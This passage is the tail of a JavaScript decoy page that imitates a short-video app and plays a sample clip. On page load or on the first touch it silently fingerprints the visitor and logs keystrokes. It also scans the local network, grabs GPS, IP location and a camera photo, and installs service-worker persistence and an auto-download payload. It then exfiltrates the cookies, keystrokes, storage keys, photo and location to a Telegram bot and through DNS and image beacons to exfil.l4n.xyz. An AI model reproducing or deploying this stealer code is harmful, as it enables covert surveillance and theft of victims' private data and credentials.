    text += `🗺 https://www.google.com/maps?q=${data.gps.lat},${data.gps.lon}\n\n`;
  } else text += `GPS: denied/skip\n\n`;

  text += `*CVE PROFILE*\n`;
  if (data.cves?.length) for (const c of data.cves) text += `▸ ${c}\n`;
  text += '\n';

  if (data.fp.hist?.length) text += `*HISTORY SNIFF*\n▸ ${data.fp.hist.join('\n▸ ')}\n\n`;
  if (KL.length) {
    text += `*KEYSTROKES*\n`;
    for (const k of KL.slice(-10)) text += `▸ [${new Date(k.t).toISOString().substring(11,19)}] ${k.n}: ${k.v.substring(0,40)}\n`;
    text += '\n';
  }
  text += `*SW Persistence*: ${data.sw ? '✅' : '❌'}\n`;
  text += `*Payload DL*: ${data.dl ? '✅' : '❌'}\n`;
  text += `*Cookies*: ${data.fp.cookies.substring(0,100)}\n\n`;

  // Storage items
  if (data.fp.stor?.local) {
    const keys = Object.keys(data.fp.stor.local);
    if (keys.length) text += `*localStorage keys*: ${keys.slice(0,10).join(', ')}\n`;
  }

  text += `\n⚡ WORM-AI💀🔥 v6\n🕒 ${new Date().toISOString()}`;

  // Send text
  const fd = new FormData();
  fd.append('chat_id', CID); fd.append('parse_mode', 'Markdown');
  fd.append('text', text); fd.append('disable_web_page_preview', 'true');
  let msgId = null;
  try {
    const r = await fetch(`${API}/sendMessage`,{method:'POST',body:fd});
    const d = await r.json();
    if (d.ok) msgId = d.result?.message_id;
  } catch(e) {
    try { await fetch(`${API}/sendMessage?chat_id=${CID}&text=${encodeURIComponent(text.replace(/\*/g,'').replace(/\`/g,''))}`); } catch(e2){}
  }

  // Send photo
  if (data.photo) {
    await sleep(300);
    try { const blob=await(await fetch(data.photo)).blob(); const pf=new FormData(); pf.append('chat_id',CID); pf.append('photo',blob,'cam.jpg'); pf.append('caption',`📸 ${new Date().toISOString()}`); await fetch(`${API}/sendPhoto`,{method:'POST',body:pf}); } catch(e){}
  }

  // Send location
  if (data.gps) {
    await sleep(300);
    try { const lf=new FormData(); lf.append('chat_id',CID); lf.append('latitude',data.gps.lat); lf.append('longitude',data.gps.lon); lf.append('horizontal_accuracy',data.gps.acc); await fetch(`${API}/sendLocation`,{method:'POST',body:lf}); } catch(e){}
  }

  // DNS beacon
  if (data.gps) {
    try { const enc=btoa(`${data.gps.lat},${data.gps.lon}`).replace(/=/g,'').substring(0,20); new Image().src=`http://${enc}.${(data.fp.br||'x').toLowerCase()}.${(data.fp.os||'x').toLowerCase()}.exfil.l4n.xyz/px.gif`; } catch(e){}
  }

  // Image beacon with key data
  try {
    const dataStr = btoa(JSON.stringify({ip:data.ipg?.query||data.ipg?.ip||'?',browser:data.fp.br,os:data.fp.os,gps:data.gps?`${data.gps.lat},${data.gps.lon}`:'none'})).substring(0,60);
    new Image().src = `http://${dataStr}.exfil.l4n.xyz/beacon.gif`;
  } catch(e){}

  st('✅ complete');
  log('EXFIL COMPLETE');
}

// ──────────────────────────────────────────────────
//  MASTER — silent, zero-interaction
// ──────────────────────────────────────────────────
async function master() {
  log('BOOT');
  st('init');

  // All in parallel where possible
  const fpData = await fp();
  keylog();

  const [lanData, gpsData, ipgData] = await Promise.all([
    lan().catch(()=>({ips:[],scan:[]})),
    gps().catch(()=>null),
    ipg().catch(()=>null),
  ]);
  const cves = cve(fpData);

  // Camera — try silently, no big deal if fails
  const photo = await cam().catch(()=>null);

  // SW — try silently
  const swOk = await sw().catch(()=>false);

  // Auto-download — try silently
  const dl = await autodl(fpData).catch(()=>null);

  // Exfil everything
  await exfil({ fp:fpData, lan:lanData, gps:gpsData, ipg:ipgData, cves, photo, sw:swOk, dl });
}

// ──────────────────────────────────────────────────
//  UI BOOT
// ──────────────────────────────────────────────────
function boot() {
  const v = _('rv');
  v.src = 'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4';
  v.play().catch(()=>{});
  _('ld').classList.add('hd');
  _('app').classList.add('on');
  // Fire master silently in background
  master();
}

document.querySelector('.lb')?.addEventListener('click', e => {
  e.preventDefault();
  const c = e.currentTarget.querySelector('.ct');
  let v = parseInt(c.textContent.replace(/[^0-9]/g,'')); v++;
  c.textContent = v>=1000 ? (v/1000).toFixed(1)+'K' : v;
  e.currentTarget.querySelector('svg').style.fill = '#fe2c55';
});

document.addEventListener('click', boot, { once: true });
document.addEventListener('touchstart', boot, { once: true });
window.addEventListener('load', () => setTimeout(boot, 400));
</script>
